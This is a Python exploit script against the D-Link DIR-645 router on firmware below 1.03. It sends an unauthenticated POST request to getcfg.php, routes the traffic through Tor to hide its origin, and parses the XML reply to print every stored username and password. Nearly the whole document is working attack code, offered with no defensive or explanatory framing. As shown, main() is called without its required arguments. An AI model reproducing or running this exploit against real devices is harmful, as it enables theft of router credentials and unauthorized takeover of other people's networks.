#!/usr/bin/python3

import socket
import socks
import sys
import urllib
import xml.etree.ElementTree as ET
from sockshandler import SocksiPyHandler
from termcolor import colored


def main(rhost, rport):
	'''
	This script exploits a vulnerability in the D-Link DIR-645 router that allows any
	unauthenticated user to grab the usernames and passwords of every user on the  
	router. These credentials can then be used to sign into the web interface.
	Only works on firmware versions < 1.03
	'''

	# Initialize the colored stamps because colors are fun
	yay_stamp 	= colored('[*] ', 'blue')
	fail_stamp 	= colored('[!] ', 'red')
	remote_host = rhost
	remote_port = rport
	url 		= 'http://%s:%s/getcfg.php' %(remote_host, remote_port)

	print (yay_stamp + 'Creating request parameters...')

	header = {
		'Host' : '%s:%s' %(remote_host, remote_port),
		'User-Agent' : 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1',
		'Content-Type' : 'application/x-www-form-urlencoded',
		'Content-Length' : '23',
		'Connection' : 'close'
	}

	# Create the opener so we can pipe our request through TOR
	opener = urllib.request.build_opener(SocksiPyHandler(socks.SOCKS5, '127.0.0.1', 9050))

	# Set parameters for the POST request
	post_args = ({
		'SERVICES': 'DEVICE.ACCOUNT'	
	})

	# URL encode the arguments and craft the HTTP request
	enc_post_args 	= urllib.parse.urlencode(post_args).encode('ascii')
	request 		= urllib.request.Request(url, enc_post_args, header)

	# Store response, then parse through it to find user/pass combos
	try:
		response_xml = opener.open(request, timeout = 10).read().decode('utf-8')
	except socks.ProxyConnectionError as e:
		sys.exit(fail_stamp + 'Could not connect to the SOCKS proxy. Is TOR running?')
	except Exception:
		sys.exit(fail_stamp + 'Could not make a connection to %s on port %s' %(remote_host, remote_port))

	print (yay_stamp + 'Sending POST request to %s...\n' %remote_host)

	# Turn the response into an XML format that we can parse through to get information
	root_tree = ET.fromstring(response_xml)
	
	if root_tree.find('result') is None:
		for e in root_tree.iter('entry'):
			user = e.find('name').text
			pswd = e.find('password').text
			print ('[*] Username: %s | password: %s' %(user, pswd))

	else:
		print (fail_stamp + 'Could not retrieve credentials')
		print (fail_stamp + 'This module does not support the firmware version')

	print ('\n[*] Done!')

if __name__ == '__main__':
	main()